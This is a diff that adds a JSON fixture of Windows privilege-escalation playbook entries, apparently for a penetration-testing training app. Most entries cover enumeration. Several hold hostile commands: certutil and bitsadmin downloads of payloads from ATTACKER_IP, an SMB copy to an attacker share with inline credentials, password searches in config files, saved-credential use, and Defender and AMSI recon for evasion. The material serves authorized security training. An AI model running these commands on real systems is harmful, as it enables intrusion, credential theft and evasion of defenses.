@@ -1,0 +1,291 @@
+[
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 101,
+    "fields": {
+      "title": "Enumeration - System and Patch Baseline",
+      "slug": "windows-enum-system-patch-baseline",
+      "platform": "windows",
+      "category": "enumeration",
+      "tags": "enumeration,system,patches",
+      "summary": "Collect OS, architecture and hotfix overview in one pass.",
+      "prerequisites": "Command shell or PowerShell session in an authorized lab host.",
+      "commands": "systeminfo\nwmic qfe get Caption,Description,HotFixID,InstalledOn\nwhoami /all",
+      "explanation": "Builds baseline context for privilege escalation and missing patch analysis.",
+      "warnings": "Output may contain sensitive host metadata.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 102,
+    "fields": {
+      "title": "Enumeration - User, Group and Session Mapping",
+      "slug": "windows-enum-user-group-session-mapping",
+      "platform": "windows",
+      "category": "enumeration",
+      "tags": "enumeration,users,groups,sessions",
+      "summary": "Map local users/groups and currently logged sessions.",
+      "prerequisites": "Standard user shell.",
+      "commands": "net user\nnet localgroup administrators\nquery user\nqwinsta",
+      "explanation": "Helps identify privileged users and potential session hijack opportunities.",
+      "warnings": "Some commands may be restricted by policy.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 103,
+    "fields": {
+      "title": "Services - Unquoted Service Path Audit",
+      "slug": "windows-services-unquoted-path-audit",
+      "platform": "windows",
+      "category": "services",
+      "tags": "services,unquoted,path",
+      "summary": "Find service binaries vulnerable to unquoted path abuse.",
+      "prerequisites": "Access to WMIC/PowerShell commands.",
+      "commands": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\" | findstr /i /v \"\"\"\"",
+      "explanation": "Highlights path parsing issues that may allow binary planting.",
+      "warnings": "Manual validation required before classifying as exploitable.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 104,
+    "fields": {
+      "title": "Services - Weak Permission Discovery",
+      "slug": "windows-services-weak-permission-discovery",
+      "platform": "windows",
+      "category": "services",
+      "tags": "services,permissions,acl",
+      "summary": "Check service DACL and binary ACL weaknesses.",
+      "prerequisites": "PowerShell and sc.exe available.",
+      "commands": "sc query state= all\nfor /f \"tokens=2 delims=:\" %s in ('sc query ^| findstr SERVICE_NAME') do @sc sdshow %s",
+      "explanation": "Weak service ACLs can allow config changes or binary overwrite.",
+      "warnings": "Review ACL output carefully; false positives are common.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 105,
+    "fields": {
+      "title": "Scheduled Tasks - Enumerate All Tasks",
+      "slug": "windows-schtasks-enumerate-all",
+      "platform": "windows",
+      "category": "scheduled tasks",
+      "tags": "scheduled tasks,schtasks,enumeration",
+      "summary": "List task names, run-as accounts and execution paths.",
+      "prerequisites": "schtasks.exe accessible.",
+      "commands": "schtasks /query /fo LIST /v",
+      "explanation": "Useful for spotting tasks running as SYSTEM from writable paths.",
+      "warnings": "Verbose output is large; redirect to file if needed.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 106,
+    "fields": {
+      "title": "Scheduled Tasks - Writable Action Path Check",
+      "slug": "windows-schtasks-writable-action-check",
+      "platform": "windows",
+      "category": "scheduled tasks",
+      "tags": "scheduled tasks,writable,paths",
+      "summary": "Cross-check task action binaries against writable folders.",
+      "prerequisites": "Task list and filesystem ACL visibility.",
+      "commands": "schtasks /query /fo LIST /v | findstr /i \"TaskName Task To Run Run As User\"\nicacls C:\\Path\\To\\Task\\Binary.exe",
+      "explanation": "Writable binaries executed by privileged tasks are high-risk findings.",
+      "warnings": "Do not modify binaries outside controlled labs.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 107,
+    "fields": {
+      "title": "Credentials - Unattend and Config Harvest",
+      "slug": "windows-credentials-unattend-config-harvest",
+      "platform": "windows",
+      "category": "credentials",
+      "tags": "credentials,unattend,config",
+      "summary": "Search unattended installation and config files for secrets.",
+      "prerequisites": "Read access to common system directories.",
+      "commands": "dir /s /b C:\\unattend*.xml C:\\Windows\\Panther\\Unattend\\*.xml 2>nul\nfindstr /si password C:\\*.xml C:\\*.ini C:\\*.txt 2>nul",
+      "explanation": "Legacy deployment files often leak local admin credentials.",
+      "warnings": "Handle discovered credentials under authorized scope only.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 108,
+    "fields": {
+      "title": "Credentials - Saved Credential Store Review",
+      "slug": "windows-credentials-saved-store-review",
+      "platform": "windows",
+      "category": "credentials",
+      "tags": "credentials,cmdkey,vault",
+      "summary": "Inspect local credential manager artifacts.",
+      "prerequisites": "User context with vault access.",
+      "commands": "cmdkey /list\nwhoami /user\nrunas /savecred /user:DOMAIN\\user cmd",
+      "explanation": "Saved credentials can expose lateral movement opportunities.",
+      "warnings": "Avoid executing privileged actions without explicit approval.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 109,
+    "fields": {
+      "title": "PowerShell - Execution and Logging Posture",
+      "slug": "windows-powershell-execution-logging-posture",
+      "platform": "windows",
+      "category": "powershell",
+      "tags": "powershell,policy,logging",
+      "summary": "Check execution policy and transcript/module logging state.",
+      "prerequisites": "PowerShell access.",
+      "commands": "powershell -c \"Get-ExecutionPolicy -List\"\npowershell -c \"Get-ItemProperty HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\* -ErrorAction SilentlyContinue\"",
+      "explanation": "Supports assessing script execution constraints and forensic coverage.",
+      "warnings": "Policy output varies by user scope and GPO refresh status.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 110,
+    "fields": {
+      "title": "PowerShell - AMSI and Defender Recon",
+      "slug": "windows-powershell-amsi-defender-recon",
+      "platform": "windows",
+      "category": "powershell",
+      "tags": "powershell,amsi,defender",
+      "summary": "Collect defensive posture data from native PowerShell cmdlets.",
+      "prerequisites": "PowerShell with access to Defender module.",
+      "commands": "powershell -c \"Get-MpComputerStatus\"\npowershell -c \"Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\"",
+      "explanation": "Helps tune lab tradecraft to endpoint controls.",
+      "warnings": "On non-Defender hosts these commands may fail gracefully.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 111,
+    "fields": {
+      "title": "File Transfer - Certutil Download Workflow",
+      "slug": "windows-file-transfer-certutil-download",
+      "platform": "windows",
+      "category": "file transfer",
+      "tags": "transfer,certutil,http",
+      "summary": "Use certutil to retrieve artifacts from controlled infrastructure.",
+      "prerequisites": "Outbound HTTP/S allowed in the lab.",
+      "commands": "certutil -urlcache -f http://ATTACKER_IP/tool.exe tool.exe\ncertutil -decode payload.b64 payload.bin",
+      "explanation": "Common fallback when browsers and PowerShell web cmdlets are restricted.",
+      "warnings": "Replace ATTACKER_IP with your authorized lab server.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 112,
+    "fields": {
+      "title": "File Transfer - SMB Copy via Admin Share",
+      "slug": "windows-file-transfer-smb-admin-share",
+      "platform": "windows",
+      "category": "file transfer",
+      "tags": "transfer,smb,copy",
+      "summary": "Transfer files over SMB shares in an internal lab network.",
+      "prerequisites": "Reachable SMB server and valid credentials.",
+      "commands": "net use \\ATTACKER_IP\\share /user:LAB\\user Passw0rd!\ncopy tool.exe \\ATTACKER_IP\\share\\tool.exe",
+      "explanation": "SMB-based transfer is reliable in segmented internal exercises.",
+      "warnings": "Do not embed real credentials in scripts outside lab contexts.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 113,
+    "fields": {
+      "title": "LOLBAS - Bitsadmin and Certutil Mapping",
+      "slug": "windows-lolbas-bitsadmin-certutil-mapping",
+      "platform": "windows",
+      "category": "LOLBAS",
+      "tags": "lolbas,bitsadmin,certutil",
+      "summary": "Document built-in binaries usable for download and execution flow.",
+      "prerequisites": "Legacy utilities available on host.",
+      "commands": "bitsadmin /transfer job /download /priority normal http://ATTACKER_IP/payload.exe C:\\Temp\\payload.exe\ncertutil -urlcache -f http://ATTACKER_IP/payload.exe payload.exe",
+      "explanation": "LOLBAS workflows reduce dependency on external binaries.",
+      "warnings": "Defender/EDR often flags these patterns.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 114,
+    "fields": {
+      "title": "LOLBAS - Mshta and Rundll32 Discovery",
+      "slug": "windows-lolbas-mshta-rundll32-discovery",
+      "platform": "windows",
+      "category": "LOLBAS",
+      "tags": "lolbas,mshta,rundll32",
+      "summary": "Catalogue native script/dll execution binaries for lab scenarios.",
+      "prerequisites": "Host includes legacy script engines.",
+      "commands": "where mshta\nwhere rundll32\nwhere regsvr32",
+      "explanation": "Inventory phase before testing signed-binary proxy execution behavior.",
+      "warnings": "Execution tests should be performed only with explicit authorization.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 115,
+    "fields": {
+      "title": "UAC Bypass - Policy and Integrity Recon",
+      "slug": "windows-uac-bypass-policy-integrity-recon",
+      "platform": "windows",
+      "category": "UAC bypass",
+      "tags": "uac,integrity,policy",
+      "summary": "Review UAC policy values and current token integrity level.",
+      "prerequisites": "Standard user shell.",
+      "commands": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nwhoami /groups | findstr /i mandatory",
+      "explanation": "Determines whether auto-elevate style vectors are realistic.",
+      "warnings": "Policy interpretation differs across Windows versions.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 116,
+    "fields": {
+      "title": "UAC Bypass - AutoElevate Binary Inventory",
+      "slug": "windows-uac-bypass-autoelevate-inventory",
+      "platform": "windows",
+      "category": "UAC bypass",
+      "tags": "uac,autoelevate,inventory",
+      "summary": "Inventory common auto-elevate binaries before manual verification.",
+      "prerequisites": "Access to system directories and registry queries.",
+      "commands": "dir C:\\Windows\\System32\\fodhelper.exe\ndir C:\\Windows\\System32\\computerdefaults.exe\nreg query HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "explanation": "Recon-only step to prepare controlled UAC bypass validation in labs.",
+      "warnings": "Do not execute bypass steps on production systems.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  }
+]
+
